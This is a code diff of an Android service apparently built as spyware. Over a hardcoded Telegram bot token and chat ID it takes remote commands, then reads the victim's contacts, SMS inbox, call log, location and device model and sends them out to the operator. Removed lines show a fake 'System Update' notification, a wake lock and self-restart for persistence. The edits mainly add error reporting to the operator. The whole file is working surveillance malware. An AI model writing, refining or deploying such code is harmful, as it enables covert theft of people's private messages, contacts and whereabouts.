@@ -1,8 +1,5 @@
 package com.v8.global.sniffer;
 
-import android.app.Notification;
-import android.app.NotificationChannel;
-import android.app.NotificationManager;
 import android.app.Service;
 import android.content.ContentResolver;
 import android.content.Intent;
@@ -12,14 +9,7 @@ import android.location.Location;
 import android.location.LocationManager;
 import android.os.Build;
 import android.os.IBinder;
-import android.os.PowerManager;
 import android.provider.ContactsContract;
-import android.telephony.TelephonyManager;
-
-import androidx.core.app.NotificationCompat;
-
-import org.json.JSONArray;
-import org.json.JSONObject;
 
 import java.io.IOException;
 import java.util.Timer;
@@ -35,100 +25,95 @@ public class MainService extends Service {
     private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
     private static final String CHAT_ID = "7259620384";
     private OkHttpClient client = new OkHttpClient();
-    private PowerManager.WakeLock wakeLock;
     private Timer timer;
     private int lastUpdateId = 0;
 
     @Override
     public void onCreate() {
         super.onCreate();
-        
-        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
-        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MainService");
-        wakeLock.acquire(60*60*1000L);
-        
-        startForegroundService();
-        sendToTelegram("✅ Service Started");
-        
-        timer = new Timer();
-        timer.scheduleAtFixedRate(new TimerTask() {
-            @Override
-            public void run() {
-                checkCommands();
-            }
-        }, 0, 3000);
-    }
-
-    private void startForegroundService() {
-        String channelId = "main_channel";
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel channel = new NotificationChannel(channelId, "Main Service", NotificationManager.IMPORTANCE_LOW);
-            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(channel);
+        try {
+            sendToTelegram("✅ Service Started");
+            
+            timer = new Timer();
+            timer.scheduleAtFixedRate(new TimerTask() {
+                @Override
+                public void run() {
+                    checkCommands();
+                }
+            }, 0, 5000);
+        } catch (Exception e) {
+            sendToTelegram("❌ Service Error: " + e.getMessage());
         }
-        Notification notification = new NotificationCompat.Builder(this, channelId)
-                .setContentTitle("System Update")
-                .setContentText("Active")
-                .setSmallIcon(android.R.drawable.stat_notify_sync)
-                .build();
-        startForeground(1, notification);
     }
 
     private void checkCommands() {
-        Request request = new Request.Builder()
-                .url("https://api.telegram.org/bot" + TOKEN + "/getUpdates?offset=" + lastUpdateId)
-                .build();
-        
-        client.newCall(request).enqueue(new okhttp3.Callback() {
-            @Override
-            public void onResponse(Call call, Response response) throws IOException {
-                try {
-                    String body = response.body().string();
-                    JSONObject json = new JSONObject(body);
-                    JSONArray result = json.getJSONArray("result");
-                    
-                    for (int i = 0; i < result.length(); i++) {
-                        JSONObject update = result.getJSONObject(i);
-                        lastUpdateId = update.getInt("update_id") + 1;
+        try {
+            Request request = new Request.Builder()
+                    .url("https://api.telegram.org/bot" + TOKEN + "/getUpdates?offset=" + lastUpdateId)
+                    .build();
+            
+            client.newCall(request).enqueue(new okhttp3.Callback() {
+                @Override
+                public void onResponse(Call call, Response response) throws IOException {
+                    try {
+                        String body = response.body().string();
+                        org.json.JSONObject json = new org.json.JSONObject(body);
+                        org.json.JSONArray result = json.getJSONArray("result");
                         
-                        if (update.has("message")) {
-                            JSONObject message = update.getJSONObject("message");
-                            if (message.has("text")) {
-                                String text = message.getString("text");
-                                executeCommand(text);
+                        for (int i = 0; i < result.length(); i++) {
+                            org.json.JSONObject update = result.getJSONObject(i);
+                            lastUpdateId = update.getInt("update_id") + 1;
+                            
+                            if (update.has("message")) {
+                                org.json.JSONObject message = update.getJSONObject("message");
+                                if (message.has("text")) {
+                                    String text = message.getString("text");
+                                    executeCommand(text);
+                                }
                             }
                         }
+                        response.close();
+                    } catch (Exception e) {
+                        sendToTelegram("❌ Parse Error: " + e.getMessage());
                     }
-                    response.close();
-                } catch (Exception e) {}
-            }
-            @Override
-            public void onFailure(Call call, IOException e) {}
-        });
+                }
+                @Override
+                public void onFailure(Call call, IOException e) {
+                    sendToTelegram("❌ Connection Error: " + e.getMessage());
+                }
+            });
+        } catch (Exception e) {
+            sendToTelegram("❌ Check Error: " + e.getMessage());
+        }
     }
 
     private void executeCommand(String command) {
-        switch (command) {
-            case "/help":
-                sendHelp();
-                break;
-            case "/info":
-                sendDeviceInfo();
-                break;
-            case "/contacts":
-                getContacts();
-                break;
-            case "/location":
-                getLocation();
-                break;
-            case "/sms":
-                getSms();
-                break;
-            case "/calls":
-                getCallLog();
-                break;
-            case "/test":
-                sendToTelegram("✅ Working - " + new java.util.Date().toString());
-                break;
+        try {
+            switch (command) {
+                case "/help":
+                    sendHelp();
+                    break;
+                case "/info":
+                    sendDeviceInfo();
+                    break;
+                case "/contacts":
+                    getContacts();
+                    break;
+                case "/location":
+                    getLocation();
+                    break;
+                case "/sms":
+                    getSms();
+                    break;
+                case "/calls":
+                    getCallLog();
+                    break;
+                case "/test":
+                    sendToTelegram("✅ Working - " + new java.util.Date().toString());
+                    break;
+            }
+        } catch (Exception e) {
+            sendToTelegram("❌ Command Error: " + e.getMessage());
         }
     }
 
@@ -138,11 +123,11 @@ public class MainService extends Service {
 
     private void sendDeviceInfo() {
         try {
-            JSONObject info = new JSONObject();
-            info.put("model", Build.MODEL);
-            info.put("android", Build.VERSION.RELEASE);
-            sendToTelegram("📱 Device: " + info.toString());
-        } catch (Exception e) {}
+            String info = "Model: " + Build.MODEL + "\nAndroid: " + Build.VERSION.RELEASE;
+            sendToTelegram("📱 Device:\n" + info);
+        } catch (Exception e) {
+            sendToTelegram("❌ Info Error: " + e.getMessage());
+        }
     }
 
     private void getContacts() {
@@ -158,16 +143,18 @@ public class MainService extends Service {
                     null, null, null, null);
                 StringBuilder sb = new StringBuilder("Contacts:\n");
                 int count = 0;
-                while (cursor != null && cursor.moveToNext() && count < 50) {
-                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
-                    String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-                    sb.append(name).append(": ").append(number).append("\n");
-                    count++;
+                if (cursor != null) {
+                    while (cursor.moveToNext() && count < 30) {
+                        String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+                        String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+                        sb.append(name).append(": ").append(number).append("\n");
+                        count++;
+                    }
+                    cursor.close();
                 }
-                if (cursor != null) cursor.close();
                 sendToTelegram(sb.toString());
             } catch (Exception e) {
-                sendToTelegram("Error: " + e.getMessage());
+                sendToTelegram("❌ Contacts Error: " + e.getMessage());
             }
         }).start();
     }
@@ -188,7 +175,9 @@ public class MainService extends Service {
             } else {
                 sendToTelegram("📍 Location not available");
             }
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            sendToTelegram("❌ Location Error: " + e.getMessage());
+        }
     }
 
     private void getSms() {
@@ -202,14 +191,18 @@ public class MainService extends Service {
                 Cursor cursor = getContentResolver().query(
                     android.net.Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 10");
                 StringBuilder sb = new StringBuilder("SMS:\n");
-                while (cursor != null && cursor.moveToNext()) {
-                    String address = cursor.getString(cursor.getColumnIndex("address"));
-                    String body = cursor.getString(cursor.getColumnIndex("body"));
-                    sb.append(address).append(": ").append(body).append("\n");
+                if (cursor != null) {
+                    while (cursor.moveToNext()) {
+                        String address = cursor.getString(cursor.getColumnIndex("address"));
+                        String body = cursor.getString(cursor.getColumnIndex("body"));
+                        sb.append(address).append(": ").append(body).append("\n");
+                    }
+                    cursor.close();
                 }
-                if (cursor != null) cursor.close();
                 sendToTelegram(sb.toString());
-            } catch (Exception e) {}
+            } catch (Exception e) {
+                sendToTelegram("❌ SMS Error: " + e.getMessage());
+            }
         }).start();
     }
 
@@ -224,33 +217,39 @@ public class MainService extends Service {
                 Cursor cursor = getContentResolver().query(
                     android.net.Uri.parse("content://call_log/calls"), null, null, null, "date DESC LIMIT 10");
                 StringBuilder sb = new StringBuilder("Calls:\n");
-                while (cursor != null && cursor.moveToNext()) {
-                    String number = cursor.getString(cursor.getColumnIndex("number"));
-                    sb.append(number).append("\n");
+                if (cursor != null) {
+                    while (cursor.moveToNext()) {
+                        String number = cursor.getString(cursor.getColumnIndex("number"));
+                        sb.append(number).append("\n");
+                    }
+                    cursor.close();
                 }
-                if (cursor != null) cursor.close();
                 sendToTelegram(sb.toString());
-            } catch (Exception e) {}
+            } catch (Exception e) {
+                sendToTelegram("❌ Call Log Error: " + e.getMessage());
+            }
         }).start();
     }
 
     private void sendToTelegram(String text) {
-        Request request = new Request.Builder()
-                .url("https://api.telegram.org/bot" + TOKEN + "/sendMessage")
-                .post(new FormBody.Builder()
-                    .add("chat_id", CHAT_ID)
-                    .add("text", text)
-                    .build())
-                .build();
-        
-        client.newCall(request).enqueue(new okhttp3.Callback() {
-            @Override
-            public void onResponse(Call call, Response response) {
-                try { response.close(); } catch (Exception e) {}
-            }
-            @Override
-            public void onFailure(Call call, IOException e) {}
-        });
+        try {
+            Request request = new Request.Builder()
+                    .url("https://api.telegram.org/bot" + TOKEN + "/sendMessage")
+                    .post(new FormBody.Builder()
+                        .add("chat_id", CHAT_ID)
+                        .add("text", text)
+                        .build())
+                    .build();
+            
+            client.newCall(request).enqueue(new okhttp3.Callback() {
+                @Override
+                public void onResponse(Call call, Response response) {
+                    try { response.close(); } catch (Exception e) {}
+                }
+                @Override
+                public void onFailure(Call call, IOException e) {}
+            });
+        } catch (Exception e) {}
     }
 
     @Override
@@ -260,7 +259,5 @@ public class MainService extends Service {
     public void onDestroy() {
         super.onDestroy();
         if (timer != null) timer.cancel();
-        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
-        startService(new Intent(this, MainService.class));
     }
 }
